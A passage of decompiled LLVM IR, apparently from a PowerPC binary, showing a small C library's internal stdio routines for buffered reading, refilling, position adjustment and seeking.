  br i1 %v1_100269a0, label %dec_label_pc_100269f4, label %dec_label_pc_10026994.dec_label_pc_100269a8_crit_edge

dec_label_pc_10026994.dec_label_pc_100269a8_crit_edge: ; preds = %dec_label_pc_10026994
  %v0_100269a8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100269a8

dec_label_pc_100269a8:                            ; preds = %dec_label_pc_1002698c.dec_label_pc_100269a8_crit_edge, %dec_label_pc_10026994.dec_label_pc_100269a8_crit_edge
  %v0_100269a8 = phi i32 [ %v0_1002698c, %dec_label_pc_1002698c.dec_label_pc_100269a8_crit_edge ], [ %v0_100269a8.pre, %dec_label_pc_10026994.dec_label_pc_100269a8_crit_edge ]
  %v0_100269ac = load i32, i32* @r31, align 4
  store i32 268593592, i32* @lr, align 4
  %v5_100269b4 = call i32 @__stdio_seek(i32 %v0_100269ac, i32* nonnull %stack_var_-56, i32 %v0_100269a8)
  %v1_100269b8 = icmp slt i32 %v5_100269b4, 0
  br i1 %v1_100269b8, label %dec_label_pc_100269f4, label %dec_label_pc_100269c0

dec_label_pc_100269c0:                            ; preds = %dec_label_pc_100269a8
  %v0_100269c0 = load i32, i32* @r31, align 4
  %v1_100269c0 = inttoptr i32 %v0_100269c0 to i16*
  %v2_100269c0 = load i16, i16* %v1_100269c0, align 2
  %v3_100269c0 = zext i16 %v2_100269c0 to i32
  store i32 %v3_100269c0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r11, align 4
  %v1_100269c8 = add i32 %v0_100269c0, 8
  %v2_100269c8 = inttoptr i32 %v1_100269c8 to i32*
  %v3_100269c8 = load i32, i32* %v2_100269c8, align 4
  store i32 %v3_100269c8, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v3_100269d0 = add i32 %v0_100269c0, 2
  %v4_100269d0 = inttoptr i32 %v3_100269d0 to i8*
  store i8 0, i8* %v4_100269d0, align 1
  %v0_100269d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100269d4 = and i32 %v0_100269d4, 65464
  store i32 %v1_100269d4, i32* %r0.global-to-local, align 4
  %v0_100269d8 = load i32, i32* @r11, align 4
  %v1_100269d8 = load i32, i32* @r31, align 4
  %v2_100269d8 = add i32 %v1_100269d8, 44
  %v3_100269d8 = inttoptr i32 %v2_100269d8 to i32*
  store i32 %v0_100269d8, i32* %v3_100269d8, align 4
  %v0_100269dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100269dc = load i32, i32* @r31, align 4
  %v2_100269dc = add i32 %v1_100269dc, 28
  %v3_100269dc = inttoptr i32 %v2_100269dc to i32*
  store i32 %v0_100269dc, i32* %v3_100269dc, align 4
  %v0_100269e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100269e0 = trunc i32 %v0_100269e0 to i16
  %v2_100269e0 = load i32, i32* @r31, align 4
  %v3_100269e0 = inttoptr i32 %v2_100269e0 to i16*
  store i16 %v1_100269e0, i16* %v3_100269e0, align 2
  %v0_100269e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100269e4 = load i32, i32* @r31, align 4
  %v2_100269e4 = add i32 %v1_100269e4, 16
  %v3_100269e4 = inttoptr i32 %v2_100269e4 to i32*
  store i32 %v0_100269e4, i32* %v3_100269e4, align 4
  %v0_100269e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100269e8 = load i32, i32* @r31, align 4
  %v2_100269e8 = add i32 %v1_100269e8, 20
  %v3_100269e8 = inttoptr i32 %v2_100269e8 to i32*
  store i32 %v0_100269e8, i32* %v3_100269e8, align 4
  %v0_100269ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100269ec = load i32, i32* @r31, align 4
  %v2_100269ec = add i32 %v1_100269ec, 24
  %v3_100269ec = inttoptr i32 %v2_100269ec to i32*
  store i32 %v0_100269ec, i32* %v3_100269ec, align 4
  br label %dec_label_pc_100269f8

dec_label_pc_100269f4:                            ; preds = %dec_label_pc_1002697c, %dec_label_pc_100269a8, %dec_label_pc_10026994
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_100269f8

dec_label_pc_100269f8:                            ; preds = %dec_label_pc_100269c0, %dec_label_pc_100269f4
  %v0_100269f8 = load i32, i32* @r28, align 4
  %v3_100269f8 = icmp eq i32 %v0_100269f8, 0
  br i1 %v3_100269f8, label %dec_label_pc_10026a00, label %dec_label_pc_10026a0c

dec_label_pc_10026a00:                            ; preds = %dec_label_pc_100269f8
  %v2_10026a00 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10026a00, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268593676, i32* @lr, align 4
  %v0_10026a08 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10026a0c

dec_label_pc_10026a0c:                            ; preds = %dec_label_pc_100269f8, %dec_label_pc_10026930, %dec_label_pc_10026a00
  store i32 %v0_1002690c, i32* %r0.global-to-local, align 4
  %v0_10026a10 = load i32, i32* @r30, align 4
  ret i32 %v0_10026a10

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 22, { 23, 53, 39, 40, 24, 41, 25, 42, 26, 27, 28, 29, 0, 43, 44, 51, 48, 49, 30, 59, 31, 54, 32, 1, 52, 33, 34, 35, 47, 36, 2, 45, 3, 55, 37, 38, 46, 56, 58, 4, 57, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 50, 22 }
  uselistorder label %dec_label_pc_10026a0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100269f8, { 1, 0 }
  uselistorder label %dec_label_pc_100269f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100269a8, { 1, 0 }
  uselistorder label %dec_label_pc_10026970, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10026a30 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10026a3c = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10026a44 = and i16 %v3_10026a3c, 4
  %v3_10026a44 = icmp eq i16 %v1_10026a44, 0
  br i1 %v3_10026a44, label %dec_label_pc_10026a4c, label %dec_label_pc_10026a84

dec_label_pc_10026a4c:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_10026a58, label %dec_label_pc_10026a50

dec_label_pc_10026a50:                            ; preds = %dec_label_pc_10026a4c
  br label %dec_label_pc_10026a58

dec_label_pc_10026a58:                            ; preds = %dec_label_pc_10026a4c, %dec_label_pc_10026a50
  %v1_10026a58 = add i32 %tmp, 4
  %v2_10026a58 = inttoptr i32 %v1_10026a58 to i32*
  %v3_10026a58 = load i32, i32* %v2_10026a58, align 4
  store i32 %v3_10026a58, i32* %r3.global-to-local, align 4
  store i32 268593760, i32* @lr, align 4
  %v1_10026a5c = call i32 @__libc_read(i32 %v3_10026a58)
  store i32 %v1_10026a5c, i32* %r3.global-to-local, align 4
  %v2_10026a60 = icmp sgt i32 %v1_10026a5c, 0
  br i1 %v2_10026a60, label %dec_label_pc_10026a84, label %dec_label_pc_10026a68

dec_label_pc_10026a68:                            ; preds = %dec_label_pc_10026a58
  %v3_10026a60 = icmp eq i32 %v1_10026a5c, 0
  %v0_10026a68 = load i32, i32* @r31, align 4
  %v1_10026a68 = inttoptr i32 %v0_10026a68 to i16*
  %v2_10026a68 = load i16, i16* %v1_10026a68, align 2
  br i1 %v3_10026a60, label %dec_label_pc_10026a70, label %dec_label_pc_10026a78

dec_label_pc_10026a70:                            ; preds = %dec_label_pc_10026a68
  %v1_10026a70 = or i16 %v2_10026a68, 4
  br label %dec_label_pc_10026a80

dec_label_pc_10026a78:                            ; preds = %dec_label_pc_10026a68
  %v1_10026a78 = or i16 %v2_10026a68, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10026a80

dec_label_pc_10026a80:                            ; preds = %dec_label_pc_10026a70, %dec_label_pc_10026a78
  %v1_10026a70.sink.off0 = phi i16 [ %v1_10026a70, %dec_label_pc_10026a70 ], [ %v1_10026a78, %dec_label_pc_10026a78 ]
  store i16 %v1_10026a70.sink.off0, i16* %v1_10026a68, align 2
  %v0_10026a94.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10026a84

dec_label_pc_10026a84:                            ; preds = %entry, %dec_label_pc_10026a58, %dec_label_pc_10026a80
  %v0_10026a94 = phi i32 [ 0, %entry ], [ %v1_10026a5c, %dec_label_pc_10026a58 ], [ %v0_10026a94.pre, %dec_label_pc_10026a80 ]
  store i32 %v0_10026a30, i32* @r31, align 4
  ret i32 %v0_10026a94

; uselistorder directives
  uselistorder i16 %v2_10026a68, { 1, 0 }
  uselistorder i32 %v1_10026a5c, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_10026a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026a80, { 1, 0 }
  uselistorder label %dec_label_pc_10026a58, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  %v3_10026ab0 = load i16, i16* %arg1, align 2
  %v4_10026ab0 = zext i16 %v3_10026ab0 to i32
  store i32 %v4_10026ab0, i32* @r11, align 4
  %tmp9 = urem i16 %v3_10026ab0, 4
  %v3_10026ab4 = icmp eq i16 %tmp9, 0
  br i1 %v3_10026ab4, label %dec_label_pc_10026b00, label %dec_label_pc_10026abc

dec_label_pc_10026abc:                            ; preds = %entry
  %v1_10026ab4 = zext i16 %tmp9 to i32
  %v1_10026abc = add nsw i32 %v1_10026ab4, -1
  store i32 %v1_10026abc, i32* @r10, align 4
  %v4_10026abc = icmp eq i32 %v1_10026abc, 0
  br i1 %v4_10026abc, label %dec_label_pc_10026b00, label %dec_label_pc_10026ac4

dec_label_pc_10026ac4:                            ; preds = %dec_label_pc_10026abc
  %v1_10026ac4 = and i32 %v4_10026ab0, 2048
  %v3_10026ac4 = icmp eq i32 %v1_10026ac4, 0
  br i1 %v3_10026ac4, label %dec_label_pc_10026b00, label %dec_label_pc_10026acc

dec_label_pc_10026acc:                            ; preds = %dec_label_pc_10026ac4
  %v2_10026acc = icmp sgt i32 %v1_10026abc, 1
  br i1 %v2_10026acc, label %dec_label_pc_10026b78, label %dec_label_pc_10026ad4

dec_label_pc_10026ad4:                            ; preds = %dec_label_pc_10026acc
  %v2_10026ad4 = add i32 %tmp, 40
  %v3_10026ad4 = inttoptr i32 %v2_10026ad4 to i32*
  %v4_10026ad4 = load i32, i32* %v3_10026ad4, align 4
  %v3_10026ad8 = icmp eq i32 %v4_10026ad4, 0
  br i1 %v3_10026ad8, label %dec_label_pc_10026ae0, label %dec_label_pc_10026b78

dec_label_pc_10026ae0:                            ; preds = %dec_label_pc_10026ad4
  %v2_10026ae0 = add i32 %tmp, 44
  %v3_10026ae0 = inttoptr i32 %v2_10026ae0 to i32*
  %v4_10026ae0 = load i32, i32* %v3_10026ae0, align 4
  %v2_10026ae4 = add i32 %tmp, 3
  %v3_10026ae4 = inttoptr i32 %v2_10026ae4 to i8*
  %v4_10026ae4 = load i8, i8* %v3_10026ae4, align 1
  %v5_10026ae4 = zext i8 %v4_10026ae4 to i32
  %v2_10026aec = sub nsw i32 %v1_10026abc, %v5_10026ae4
  %v1_10026af0 = add nsw i32 %v2_10026aec, -1
  %tmp7 = icmp slt i32 %v4_10026ae0, 1
  br i1 %tmp7, label %dec_label_pc_10026b00, label %dec_label_pc_10026af8

dec_label_pc_10026af8:                            ; preds = %dec_label_pc_10026ae0
  %v2_10026af8 = add i32 %tmp, 2
  %v3_10026af8 = inttoptr i32 %v2_10026af8 to i8*
  %v4_10026af8 = load i8, i8* %v3_10026af8, align 1
  %v5_10026af8 = zext i8 %v4_10026af8 to i32
  %v2_10026afc = sub nsw i32 %v1_10026af0, %v5_10026af8
  br label %dec_label_pc_10026b00

dec_label_pc_10026b00:                            ; preds = %dec_label_pc_10026ae0, %dec_label_pc_10026ac4, %dec_label_pc_10026abc, %entry, %dec_label_pc_10026af8
  %v0_10026b24 = phi i32 [ %v1_10026af0, %dec_label_pc_10026ae0 ], [ %v1_10026abc, %dec_label_pc_10026ac4 ], [ 0, %dec_label_pc_10026abc ], [ 0, %entry ], [ %v2_10026afc, %dec_label_pc_10026af8 ]
  %v1_10026b00 = and i32 %v4_10026ab0, 64
  %v3_10026b00 = icmp eq i32 %v1_10026b00, 0
  %storemerge.in.in.v = select i1 %v3_10026b00, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10026b14 = add i32 %tmp, 16
  %v3_10026b14 = inttoptr i32 %v2_10026b14 to i32*
  %v4_10026b14 = load i32, i32* %v3_10026b14, align 4
  %v1_10026b18 = inttoptr i32 %arg2 to i32*
  %v2_10026b18 = load i32, i32* %v1_10026b18, align 4
  store i32 %v2_10026b18, i32* %r4.global-to-local, align 4
  %v1_10026b1c = add i32 %arg2, 4
  %v2_10026b1c = inttoptr i32 %v1_10026b1c to i32*
  %v3_10026b1c = load i32, i32* %v2_10026b1c, align 4
  store i32 %v3_10026b1c, i32* %r5.global-to-local, align 4
  %v2_10026b20 = sub i32 %storemerge, %v4_10026b14
  %v2_10026b24 = add i32 %v2_10026b20, %v0_10026b24
  store i32 %v2_10026b24, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10026b24, 0
  %v1_10026b2c = zext i1 %tmp10 to i32
  %v2_10026b2c = ashr i32 %v2_10026b24, 31
  %v3_10026b2c = and i32 %v2_10026b2c, -2
  %v4_10026b2c = or i32 %v3_10026b2c, %v1_10026b2c
  %v2_10026b30 = sub i32 %v3_10026b1c, %v2_10026b24
  %v3_10026b30 = sub i32 -1, %v2_10026b24
  store i32 %v2_10026b30, i32* @r10, align 4
  %v6_10026b30 = icmp ule i32 %v2_10026b30, %v3_10026b30
  %v2_10026b34 = sub nsw i32 -1, %v4_10026b2c
  %v3_10026b34 = add i32 %v2_10026b18, %v2_10026b34
  %v5_10026b34 = zext i1 %v6_10026b30 to i32
  %v6_10026b34 = add i32 %v3_10026b34, %v5_10026b34
  store i32 %v6_10026b34, i32* %v1_10026b18, align 4
  %v0_10026b3c = load i32, i32* @r10, align 4
  %v1_10026b3c = load i32, i32* @r8, align 4
  %v2_10026b3c = add i32 %v1_10026b3c, 4
  %v3_10026b3c = inttoptr i32 %v2_10026b3c to i32*
  store i32 %v0_10026b3c, i32* %v3_10026b3c, align 4
  %v0_10026b40 = load i32, i32* @r8, align 4
  %v1_10026b40 = inttoptr i32 %v0_10026b40 to i32*
  %v2_10026b40 = load i32, i32* %v1_10026b40, align 4
  %v1_10026b44 = load i32, i32* %r4.global-to-local, align 4
  %v3_10026b44 = icmp sgt i32 %v2_10026b40, %v1_10026b44
  br i1 %v3_10026b44, label %dec_label_pc_10026b5c, label %dec_label_pc_10026b4c

dec_label_pc_10026b4c:                            ; preds = %dec_label_pc_10026b00
  %v4_10026b44 = icmp eq i32 %v2_10026b40, %v1_10026b44
  br i1 %v4_10026b44, label %dec_label_pc_10026b50, label %dec_label_pc_10026b60thread-pre-split

dec_label_pc_10026b50:                            ; preds = %dec_label_pc_10026b4c
  %v1_10026b50 = add i32 %v0_10026b40, 4
  %v2_10026b50 = inttoptr i32 %v1_10026b50 to i32*
  %v3_10026b50 = load i32, i32* %v2_10026b50, align 4
  %v1_10026b54 = load i32, i32* %r5.global-to-local, align 4
  %v3_10026b54 = icmp ugt i32 %v3_10026b50, %v1_10026b54
  br i1 %v3_10026b54, label %dec_label_pc_10026b5c, label %dec_label_pc_10026b60thread-pre-split

dec_label_pc_10026b5c:                            ; preds = %dec_label_pc_10026b50, %dec_label_pc_10026b00
  %v0_10026b5c = load i32, i32* %r31.global-to-local, align 4
  %v1_10026b5c = sub i32 0, %v0_10026b5c
  store i32 %v1_10026b5c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b60

dec_label_pc_10026b60thread-pre-split:            ; preds = %dec_label_pc_10026b4c, %dec_label_pc_10026b50
  %v0_10026b60.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b60

dec_label_pc_10026b60:                            ; preds = %dec_label_pc_10026b60thread-pre-split, %dec_label_pc_10026b5c
  %v0_10026b60 = phi i32 [ %v0_10026b60.pr, %dec_label_pc_10026b60thread-pre-split ], [ %v1_10026b5c, %dec_label_pc_10026b5c ]
  %tmp8 = icmp sgt i32 %v0_10026b60, -1
  br i1 %tmp8, label %dec_label_pc_10026b7c, label %dec_label_pc_10026b68

dec_label_pc_10026b68:                            ; preds = %dec_label_pc_10026b60
  %v0_10026b68 = call i32 @__errno_location()
  %v2_10026b70 = inttoptr i32 %v0_10026b68 to i32*
  store i32 75, i32* %v2_10026b70, align 4
  %v0_10026b80.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b7c

dec_label_pc_10026b78:                            ; preds = %dec_label_pc_10026ad4, %dec_label_pc_10026acc
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b7c

dec_label_pc_10026b7c:                            ; preds = %dec_label_pc_10026b60, %dec_label_pc_10026b68, %dec_label_pc_10026b78
  %v0_10026b80 = phi i32 [ %v0_10026b60, %dec_label_pc_10026b60 ], [ %v0_10026b80.pre, %dec_label_pc_10026b68 ], [ -1, %dec_label_pc_10026b78 ]
  ret i32 %v0_10026b80

; uselistorder directives
  uselistorder i32 %v2_10026b40, { 1, 0 }
  uselistorder i32 %v2_10026b24, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 -2, { 18, 19, 6, 5, 1, 12, 3, 7, 20, 21, 11, 29, 2, 8, 9, 10, 22, 23, 24, 13, 26, 27, 25, 28, 17, 0, 4, 14, 15, 16 }
  uselistorder i32 2048, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10026b7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026b60thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10026b00, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10026b98 = load i32, i32* @lr, align 4
  store i32 %v0_10026b98, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10026ba8 = add i32 %arg1, 8
  %v2_10026ba8 = inttoptr i32 %v1_10026ba8 to i32*
  %v3_10026ba8 = load i32, i32* %v2_10026ba8, align 4
  %v1_10026bac = add i32 %arg1, 12
  %v2_10026bac = inttoptr i32 %v1_10026bac to i32*
  %v3_10026bac = load i32, i32* %v2_10026bac, align 4
  %v2_10026bb0 = sub i32 %v3_10026bac, %v3_10026ba8
  store i32 268594104, i32* @lr, align 4
  %v3_10026bb4 = inttoptr i32 %v3_10026ba8 to i16*
  %v4_10026bb4 = call i32 @__stdio_READ(i16* %v3_10026bb4, i32 %v2_10026bb0, i32 %v2_10026bb0)
  %v0_10026bb8 = load i32, i32* @r29, align 4
  %v1_10026bb8 = add i32 %v0_10026bb8, 8
  %v2_10026bb8 = inttoptr i32 %v1_10026bb8 to i32*
  %v3_10026bb8 = load i32, i32* %v2_10026bb8, align 4
  %v2_10026bbc = add i32 %v3_10026bb8, %v4_10026bb4
  store i32 %v2_10026bbc, i32* %r0.global-to-local, align 4
  %v2_10026bc0 = add i32 %v0_10026bb8, 16
  %v3_10026bc0 = inttoptr i32 %v2_10026bc0 to i32*
  store i32 %v3_10026bb8, i32* %v3_10026bc0, align 4
  %v0_10026bc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10026bc4 = load i32, i32* @r29, align 4
  %v2_10026bc4 = add i32 %v1_10026bc4, 20
  %v3_10026bc4 = inttoptr i32 %v2_10026bc4 to i32*
  store i32 %v0_10026bc4, i32* %v3_10026bc4, align 4
  store i32 %v0_10026b98, i32* %r0.global-to-local, align 4
  ret i32 %v4_10026bb4

; uselistorder directives
  uselistorder i32 %v3_10026bb8, { 1, 0 }
  uselistorder i32 %v4_10026bb4, { 1, 0 }
  uselistorder i32 %v3_10026ba8, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10026be4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10026bf0 = load i16, i16* %arg1, align 2
  %v4_10026bf0 = zext i16 %v3_10026bf0 to i32
  %v2_10026bf4 = and i32 %v4_10026bf0, %arg2
  %v5_10026bf4 = icmp eq i32 %v2_10026bf4, 0
  br i1 %v5_10026bf4, label %dec_label_pc_10026bfc, label %dec_label_pc_10026c0c

dec_label_pc_10026bfc:                            ; preds = %entry
  %v1_10026bfc = and i32 %v4_10026bf0, 2176
  %v3_10026bfc = icmp eq i32 %v1_10026bfc, 0
  br i1 %v3_10026bfc, label %dec_label_pc_10026c04, label %dec_label_pc_10026c18

dec_label_pc_10026c04:                            ; preds = %dec_label_pc_10026bfc
  %v2_10026c04 = or i32 %v4_10026bf0, %arg2
  %v1_10026c08 = trunc i32 %v2_10026c04 to i16
  store i16 %v1_10026c08, i16* %arg1, align 2
  %v0_10026c0c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026c0c

dec_label_pc_10026c0c:                            ; preds = %entry, %dec_label_pc_10026c04
  %v0_10026c0c = phi i32 [ %tmp, %entry ], [ %v0_10026c0c.pre, %dec_label_pc_10026c04 ]
  %v1_10026c0c = inttoptr i32 %v0_10026c0c to i16*
  %v2_10026c0c = load i16, i16* %v1_10026c0c, align 2
  %v3_10026c0c = zext i16 %v2_10026c0c to i32
  %v1_10026c10 = and i32 %v3_10026c0c, 16
  %v3_10026c10 = icmp eq i32 %v1_10026c10, 0
  br i1 %v3_10026c10, label %dec_label_pc_10026c34, label %dec_label_pc_10026c18

dec_label_pc_10026c18:                            ; preds = %dec_label_pc_10026bfc, %dec_label_pc_10026c0c
  %v0_10026c18 = call i32 @__errno_location()
  store i32 %v0_10026c18, i32* %r3.global-to-local, align 4
  %v2_10026c20 = inttoptr i32 %v0_10026c18 to i32*
  store i32 9, i32* %v2_10026c20, align 4
  br label %dec_label_pc_10026c24

dec_label_pc_10026c24:                            ; preds = %dec_label_pc_10026c3c, %dec_label_pc_10026c18
  %v0_10026c24 = load i32, i32* @r31, align 4
  %v1_10026c24 = inttoptr i32 %v0_10026c24 to i16*
  %v2_10026c24 = load i16, i16* %v1_10026c24, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10026c2c = or i16 %v2_10026c24, 8
  br label %dec_label_pc_10026c68

dec_label_pc_10026c34:                            ; preds = %dec_label_pc_10026c0c
  %v1_10026c34 = and i32 %v3_10026c0c, 64
  %v3_10026c34 = icmp eq i32 %v1_10026c34, 0
  br i1 %v3_10026c34, label %dec_label_pc_10026c5c, label %dec_label_pc_10026c3c

dec_label_pc_10026c3c:                            ; preds = %dec_label_pc_10026c34
  store i32 268594240, i32* @lr, align 4
  %v0_10026c3c = call i32 @__stdio_wcommit()
  store i32 %v0_10026c3c, i32* %r3.global-to-local, align 4
  %v3_10026c40 = icmp eq i32 %v0_10026c3c, 0
  br i1 %v3_10026c40, label %dec_label_pc_10026c48, label %dec_label_pc_10026c24

dec_label_pc_10026c48:                            ; preds = %dec_label_pc_10026c3c
  %v0_10026c48 = load i32, i32* @r31, align 4
  %v1_10026c48 = inttoptr i32 %v0_10026c48 to i16*
  %v2_10026c48 = load i16, i16* %v1_10026c48, align 2
  %v3_10026c48 = zext i16 %v2_10026c48 to i32
  %v1_10026c4c = add i32 %v0_10026c48, 8
  %v2_10026c4c = inttoptr i32 %v1_10026c4c to i32*
  %v3_10026c4c = load i32, i32* %v2_10026c4c, align 4
  %v1_10026c50 = call i32 @__asm_rlwinm(i32 %v3_10026c48, i32 0, i32 26, i32 24)
  %v2_10026c50 = trunc i32 %v1_10026c50 to i16
  %v1_10026c54 = load i32, i32* @r31, align 4
  %v2_10026c54 = add i32 %v1_10026c54, 28
  %v3_10026c54 = inttoptr i32 %v2_10026c54 to i32*
  store i32 %v3_10026c4c, i32* %v3_10026c54, align 4
  %v3_10026c58 = load i32, i32* @r31, align 4
  %v4_10026c58 = inttoptr i32 %v3_10026c58 to i16*
  store i16 %v2_10026c50, i16* %v4_10026c58, align 2
  %v0_10026c5c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026c5c

dec_label_pc_10026c5c:                            ; preds = %dec_label_pc_10026c34, %dec_label_pc_10026c48
  %v0_10026c5c = phi i32 [ %v0_10026c0c, %dec_label_pc_10026c34 ], [ %v0_10026c5c.pre, %dec_label_pc_10026c48 ]
  %v1_10026c5c = inttoptr i32 %v0_10026c5c to i16*
  %v2_10026c5c = load i16, i16* %v1_10026c5c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10026c64 = or i16 %v2_10026c5c, 1
  br label %dec_label_pc_10026c68

dec_label_pc_10026c68:                            ; preds = %dec_label_pc_10026c24, %dec_label_pc_10026c5c
  %v2_10026c68 = phi i32 [ %v0_10026c24, %dec_label_pc_10026c24 ], [ %v0_10026c5c, %dec_label_pc_10026c5c ]
  %storemerge.off0 = phi i16 [ %v1_10026c2c, %dec_label_pc_10026c24 ], [ %v1_10026c64, %dec_label_pc_10026c5c ]
  %v3_10026c68 = inttoptr i32 %v2_10026c68 to i16*
  store i16 %storemerge.off0, i16* %v3_10026c68, align 2
  store i32 %v0_10026be4, i32* @r31, align 4
  %v0_10026c7c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10026c7c

; uselistorder directives
  uselistorder i32 %v4_10026bf0, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 10, 9, 11, 12, 2, 3, 4, 5, 0, 6, 7, 8, 1 }
  uselistorder i32 ()* @__stdio_wcommit, { 8, 3, 2, 1, 7, 6, 5, 4, 0 }
  uselistorder label %dec_label_pc_10026c68, { 1, 0 }
  uselistorder label %dec_label_pc_10026c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10026c18, { 1, 0 }
  uselistorder label %dec_label_pc_10026c0c, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10026c84 = load i32, i32* @lr, align 4
  store i32 %v0_10026c84, i32* %r0.global-to-local, align 4
  %v0_10026c8c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10026c98 = add i32 %arg1, 4
  %v2_10026c98 = inttoptr i32 %v1_10026c98 to i32*
  %v3_10026c98 = load i32, i32* %v2_10026c98, align 4
  %v2_10026c9c = load i32, i32* %arg2, align 4
  %v1_10026ca0 = add i32 %tmp, 4
  %v2_10026ca0 = inttoptr i32 %v1_10026ca0 to i32*
  %v3_10026ca0 = load i32, i32* %v2_10026ca0, align 4
  store i32 268594344, i32* @lr, align 4
  %v4_10026ca4 = call i32 @__libc_lseek64(i32 %v3_10026c98, i32 %v2_10026c9c, i32 %v3_10026ca0, i32 %arg3)
  %v1_10026ca8 = icmp slt i32 %v4_10026ca4, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10026ca8, label %dec_label_pc_10026cc0, label %dec_label_pc_10026cb4

dec_label_pc_10026cb4:                            ; preds = %entry
  %v1_10026cb4 = load i32, i32* @r31, align 4
  %v2_10026cb4 = inttoptr i32 %v1_10026cb4 to i32*
  store i32 %v4_10026ca4, i32* %v2_10026cb4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10026cbc = load i32, i32* @r31, align 4
  %v2_10026cbc = add i32 %v1_10026cbc, 4
  %v3_10026cbc = inttoptr i32 %v2_10026cbc to i32*
  store i32 %tmp, i32* %v3_10026cbc, align 4
  %v0_10026cc0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10026cc0

dec_label_pc_10026cc0:                            ; preds = %entry, %dec_label_pc_10026cb4
  %v0_10026cc0 = phi i32 [ %tmp, %entry ], [ %v0_10026cc0.pre, %dec_label_pc_10026cb4 ]
  store i32 %v0_10026c84, i32* %r0.global-to-local, align 4
  store i32 %v0_10026c8c, i32* @r31, align 4
  ret i32 %v0_10026cc0

; uselistorder directives
